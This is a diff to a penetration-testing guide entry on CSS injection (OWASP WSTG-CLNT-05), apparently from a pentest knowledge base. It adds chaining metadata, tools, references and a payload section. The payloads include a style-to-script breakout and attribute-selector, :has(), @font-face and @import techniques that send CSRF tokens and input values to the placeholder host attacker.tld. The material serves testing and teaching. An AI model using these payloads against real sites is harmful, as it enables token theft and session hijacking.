@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [client-side, javascript, dom, cors, wstg, clnt]
 tech_stack: []
 cwe_ids: [CWE-94]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-clnt-03, wstg-clnt-01]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-clnt-01: "CSS injection that breaks out via `}</style><script>` lands in a DOM XSS sink = a data-exfiltration/UI-redress bug escalates to full script execution and session theft (Medium -> High)"
+  wstg-clnt-03: "CSS Injection + HTML Injection = attacker controls both styling and markup, enabling a pixel-perfect credential-phishing overlay plus attribute-selector exfiltration of CSRF tokens/input values (Medium -> High)"
 ---
 
 # wstg-clnt-05
@@ -115,6 +117,78 @@ tester.test_style_injection("/profile", "theme")
 
 ---
 
+## Tools
+
+| Tool               | Purpose                                          |
+| ------------------- | --------------------------------------------------- |
+| **Burp Suite**       | Fuzz style parameters, capture exfil callbacks        |
+| **CSS Exfil Vector** | Generate attribute-selector CSS exfiltration payloads |
+| **Browser DevTools** | Inspect computed styles / `<style>` injection point   |
+
+---
+
+## Example Commands/Payloads
+
+### Basic injection payloads
+
+```css
+color:red
+background:url(https://attacker.tld/log?data=stolen)
+position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999
+}</style><script>alert(document.domain)</script><style>
+```
+
+### Attribute-selector data exfiltration (CSRF token / input value theft)
+
+```css
+input[name="csrf"][value^="a"] { background: url(https://attacker.tld/log?csrf=a); }
+input[name="csrf"][value^="b"] { background: url(https://attacker.tld/log?csrf=b); }
+/* repeat for full charset per character position */
+```
+
+### curl probe
+
+```bash
+TARGET="https://{target}"
+curl -s "$TARGET/profile?style=color:red;background:url(https://attacker.tld/x)"
+```
+
+### `:has()` selector exfiltration (styles a parent based on a child match — no sibling needed)
+
+```css
+div:has(input[name="csrf"][value^="a"]) {
+  background: url(https://attacker.tld/log?csrf=a);
+}
+```
+
+### Sibling-selector trick for hidden inputs (can't background a `type=hidden` element directly)
+
+```css
+input[name="csrf-token"][value^="a"] + input {
+  background: url(https://attacker.tld/log?q=a);
+}
+```
+
+### `@font-face` unicode-range character-presence oracle (works even when `attr()`/selector exfil is blocked)
+
+```html
+<style>
+@font-face{ font-family:poc; src: url(https://attacker.tld/?A); unicode-range:U+0041; }
+@font-face{ font-family:poc; src: url(https://attacker.tld/?B); unicode-range:U+0042; }
+#sensitive{ font-family:poc; }
+</style>
+<!-- a GET to /?A on attacker.tld confirms the character "A" is present in #sensitive's text -->
+```
+
+### Blind CSS exfiltration via `@import` (no reload required, works cross-frame)
+
+```html
+<style>@import url(https://attacker.tld/staging?len=32);</style>
+<style>@import '//attacker.tld';</style>
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -151,6 +225,15 @@ def sanitize_css(property_name, value):
 | ---------- | ----------------------------------------------------- |
 | **CWE-74** | Improper Neutralization of Special Elements in Output |
 
+
+---
+
+## References
+
+- [OWASP WSTG - Testing for CSS Injection (WSTG-CLNT-05)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)
+- [PortSwigger - CSS injection](https://portswigger.net/web-security/css-injection)
+- [CSS Exfil Vector project](https://github.com/mikesplain/css-exfil-protection)
+- [PayloadsAllTheThings - CSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSS%20Injection)
 
 ---
 
